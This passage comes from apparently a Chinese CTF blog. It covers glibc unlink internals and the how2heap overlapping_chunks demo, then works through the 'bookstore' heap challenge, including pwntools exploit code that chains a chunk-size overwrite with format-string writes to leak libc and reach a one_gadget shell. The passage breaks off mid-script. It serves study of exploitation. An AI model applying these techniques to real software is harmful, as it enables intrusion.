<li>拷贝内容到新chunk</li>
<li><code>_int_free(av,oldp,1)</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>检查newsize是否&gt;=nb，不满足则<strong>报错结束</strong></p>
<p>计算<code>remainder_size = newsize - nb</code></p>
<ul>
<li>remainder_size&lt;MINSIZE?</li>
<li><strong>是</strong>：<ul>
<li>直接设置头部，不用分割了</li>
</ul>
</li>
<li><strong>否</strong><ul>
<li>分割出remainder，并设置其prev_inuse为1，接着调用<code>_int_free(av,remainder,1)</code></li>
</ul>
</li>
</ul>
<p>返回chunk2mem，<strong>完成退出</strong></p>
<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">unlink(AV, P, BK, FD)<span class="comment">//P是指向本chunk的指针</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line">    <span class="comment">//检查本chunk的size和next chunk的prev_size段是否相等，排除了fast chunk</span></span><br><span class="line"></span><br><span class="line">	FD = P-&gt;fd;<span class="comment">//P+0x10 </span></span><br><span class="line">	BK = P-&gt;bk;<span class="comment">//P+0x18 FD和BK分别指向forward chunk和back chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) <span class="comment">//pass check</span></span><br><span class="line">    	malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br><span class="line">    <span class="comment">//检查前chunk的bk和后chunk的fd是否与P相等</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		FD-&gt;bk = BK;<span class="comment">//0x6020b8+0x18=0x6020d0(small_ptr)=0x6020c0(big_ptr)</span></span><br><span class="line">		BK-&gt;fd = FD;<span class="comment">//链表的卸下操作0x6020c0+0x10=0x6020d0(small_ptr)=0x6020b8(...)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))&amp;&amp;</span><br><span class="line">            __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">//当链表为large bin且fd_nextsize不为空</span></span><br><span class="line">        &#123;</span><br><span class="line">			<span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">				|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">				malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);</span><br><span class="line">                <span class="comment">//检查前chunk的bk_nextsize和后chunk的fd_nextsize是否与P相等</span></span><br><span class="line">            </span><br><span class="line">			<span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (P-&gt;fd_nextsize == P)	FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">				   FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                	FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                	P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                	P-&gt;bk_nextsize-&gt;fd_nextsize = FD;        </span><br><span class="line">				&#125;                                                              </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">			&#123;             </span><br><span class="line">            	 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">				P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">			&#125;                                                                                            </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/" class="post-title-link" itemprop="url">how2heap - overlapping_chunks&bookstore,night-deamonic-heap</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-17 20:04:10" itemprop="dateCreated datePublished" datetime="2020-02-17T20:04:10+08:00">2020-02-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-02-29 18:08:42" itemprop="dateModified" datetime="2020-02-29T18:08:42+08:00">2020-02-29</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="how2heap-overlapping-chunks-amp-bookstore-night-deamonic-heap"><a href="#how2heap-overlapping-chunks-amp-bookstore-night-deamonic-heap" class="headerlink" title="how2heap - overlapping_chunks&amp;bookstore,night-deamonic-heap"></a>how2heap - overlapping_chunks&amp;bookstore,night-deamonic-heap</h1><p>ubuntu16.04        libc2.23</p>
<h1 id="overlapping-chunks-c"><a href="#overlapping-chunks-c" class="headerlink" title="overlapping_chunks.c"></a>overlapping_chunks.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThis is a simple chunks overlapping problem\n\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's start to allocate 3 chunks on the heap\n"</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">'2'</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's free the chunk p2\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"For a toy program, the value of the last 3 bits is unimportant;"</span></span><br><span class="line">		<span class="string">" however, it is best to maintain the stability of the heap.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"</span></span><br><span class="line">		<span class="string">" to assure that p1 is not mistaken for a free chunk.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n"</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the "size" field of chunk p2</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow let's allocate another chunk with a size equal to the data\n"</span></span><br><span class="line">	       <span class="string">"size of the chunk p2 injected size\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This malloc will be served from the previously freed chunk that\n"</span></span><br><span class="line">	       <span class="string">"is parked in the unsorted bin which size has been modified by us\n"</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 has been allocated at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 starts at %p and ends at %p\n"</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 should overlap with p3, in this case p4 includes all p3.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"</span></span><br><span class="line">		<span class="string">" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's run through an example. Right now, we have:\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIf we memset(p4, '4', %d), we have:\n"</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">'4'</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nAnd if we then memset(p3, '3', 80), we have:\n"</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">'3'</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = %s\n"</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p3 = %s\n"</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个比较简单的oevrflow的示例</p>
<p>首先申请了3个chunk</p>
<p>0x100（p1）<br>0x100（p2）<br>0x80（p3）</p>
<p>当我们把0x100的chunk放入unsortedbin之后，模拟p1 overflow修改p2的size为0x180，再通过malloc(0x180-8)即可直接卸下unsortedbin中这个fake 0x180的chunk，达到overlap p3的目的</p>
<p>由于比较简单这里就没放debug的过程，直接开始撸题吧2333</p>
<h1 id="bookstore"><a href="#bookstore" class="headerlink" title="bookstore"></a>bookstore</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序比较简单</p>
<img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581674823828.png" width="70%" height="70%">

<p>上来先malloc了三个0x90的small chunk</p>
<p>堆上的内容此时是这样的</p>
<table>
<thead>
<tr>
<th>order1</th>
<th>order2</th>
<th>malloc_dest</th>
</tr>
</thead>
<tbody><tr>
<td>0x90</td>
<td>0x90</td>
<td>0x90</td>
</tr>
</tbody></table>
<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581674900909.png" width="70%" height="70%">

<p>下面就是一个循环+switch的结构，循环由v4控制，v4为1后结束循环</p>
<p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581675282813.png" alt="1581675282813"></p>
<p>结束循环之后存在格式化字符串漏洞，fmt为malloc_dest</p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581675013218.png" alt="1581675013218"></p>
<p>无长度检查，存在overflow，在输入的末尾<code>\n</code>处会改成<code>\x00</code></p>
<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581675079810.png" alt="1581675079810"></p>
<p>free就是单纯的free，没有清零指针</p>
<h3 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h3><img src="/2020/02/17/how2heap-overlapping-chunks-bookstore-night-deamonic-heap/1581760790065.png" width="85%" height="85%">

<p>就是用order1和order2的内容来填充submit_chunk</p>
<h2 id="Exploite"><a href="#Exploite" class="headerlink" title="Exploite"></a>Exploite</h2><p>程序的chunk的是一开始就malloc好的，无法自己malloc，但是能自己free，当选择5之后可以malloc一个0x150大小的chunk，所以第一思路肯定是free chunk2后通过chunk1更改chunk2的size，然后申请submit_chunk时会返回chunk2的地址，由于submit_chunk比较大，会和malloc_dest形成overlapping，通过修改submit_chunk的内容，溢出到malloc_dest触发格式化字符串漏洞（这里选择时的s可以输入一个比较大的buffer，可以在buffer中填上指针来修改内容）。</p>
<p>因为overlap之后的拷贝操作是先把chunk1的内容拷贝到chunk2，然后再把chunk2的内容加到chunk2后面，所以要计算偏移，具体计算如上图注释，想要malloc_dest刚好放置我们的格式化串我们只需要满足chunk1中有0x74个Byte的内容即可</p>
<p>可是我找了一会之后发现，因为只能用一次格式化字符串，而且在之前也无法泄露，栈指针和libc都利用不了，只能用程序里面的，要么是GOT表，要么是其他可写的段，当然在这里我很自然的联想到了<code>.fini</code>段，这个段是程序结束之后要调用的函数指针，我可以修改它为main函数地址（不过只能利用一次），然后在修改<code>.fini</code>段的时候顺带把栈地址、libc地址一并泄露（只要到程序栈上找到就行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1=((<span class="string">'%'</span>+str(<span class="number">0xA39</span>)+<span class="string">'c%13$hn|%19$p|%31$p'</span>).ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)).ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+<span class="string">'\x50\x01'</span></span><br><span class="line"><span class="comment">#下面的0x6011B8会放在%13$n处，%19$p是一个栈地址，%31$p是libc_start_main的返回地址，A39是main函数地址地位</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)<span class="comment">#溢出修改size</span></span><br><span class="line"></span><br><span class="line">submit(<span class="number">0x6011B8</span>)<span class="comment">#选择时顺带填上地址，然后此时malloc的chunk就会overlap了</span></span><br></pre></td></tr></table></figure>

<p>然后计算对应地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ret_stack=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0x18</span><span class="comment">#stack address of ret</span></span><br><span class="line">libc_base=int(p.recv(<span class="number">15</span>).strip(<span class="string">'|'</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">one=<span class="number">0x45216</span>+libc_base<span class="comment">#one_gadget</span></span><br></pre></td></tr></table></figure>

<p>之后第二次利用与第一次相同，但是有一点，one_gaget的地址可能与第二次执行的返回地址有3个Byte不一样，那怎么办。所以第二次我们可以修改两次（为什么不是三次是因为三个字节的大小顺序可能会不一样，在使用<code>%hhn</code>写入的时候前面的输出会对后面产生影响，但是如果一次改两个字节<code>%hn</code>和一次改一个字节<code>%hn</code>就可以控制顺序了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">change1=one&amp;<span class="number">0xffff</span></span><br><span class="line">change2=one&amp;<span class="number">0xff0000</span></span><br><span class="line">change2=change2&gt;&gt;<span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>printf时我们写入的地址在栈上的偏移需要自己计算一下，地址也需要计算一下，因为此时的栈已经变了，不过偏移是固定的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1=((<span class="string">'%0'</span>+str(change2)+<span class="string">'d%14$hhn|%0'</span>+str(change1-change2<span class="number">-1</span>)+<span class="string">'d%13$hn|'</span>).ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)).ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+<span class="string">'\x50\x01'</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line"></span><br><span class="line">submit(ret_stack<span class="number">-0x110</span>,ret_stack<span class="number">-0x110</span>+<span class="number">2</span>)<span class="comment">#submit时填上两个地址</span></span><br></pre></td></tr></table></figure>

<p>最终getshell</p>
<h2 id="完整Exp"><a href="#完整Exp" class="headerlink" title="完整Exp"></a>完整Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./books'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(x,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(str(x))</span><br><span class="line">	p.recvuntil(<span class="string">' order:\n'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(x)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	<span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">		p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">'4'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(address,address2=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'5: Submit\n'</span>)</span><br><span class="line">	p.sendline(p64(<span class="number">0x35</span>)+p64(address)+p64(address2))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1=((<span class="string">'%'</span>+str(<span class="number">0xA39</span>)+<span class="string">'c%13$hn|%19$p|%31$p'</span>).ljust(<span class="number">0x74</span>,<span class="string">'a'</span>)).ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+<span class="string">'\x50\x01'</span></span><br><span class="line">edit(<span class="number">1</span>,payload1)</span><br><span class="line"></span><br><span class="line">submit(<span class="number">0x6011B8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'|'</span>)</span><br><span class="line">ret_stack=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0x18</span></span><br><span class="line">libc_base=int(p.recv(<span class="number">15</span>).strip(<span class="string">'|'</span>),<span class="number">16</span>)<span class="number">-0x20830</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span class="string">'ret_stack:'</span>+hex(ret_stack)+<span class="string">'\nlibc_base:'</span>+hex(libc_base)+ <span class="string">"\033[0m"</span>)</span><br><span class="line">one=<span class="number">0x45216</span>+libc_base</span><br><span class="line"></span><br><span class="line">change1=one&amp;<span class="number">0xffff</span></span><br><span class="line">change2=one&amp;<span class="number">0xff0000</span></span><br><span class="line">change2=change2&gt;&gt;<span class="number">16</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span class="string">'one_gadget:'</span>+hex(one)+<span class="string">"\033[0m"</span>)</span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> +<span 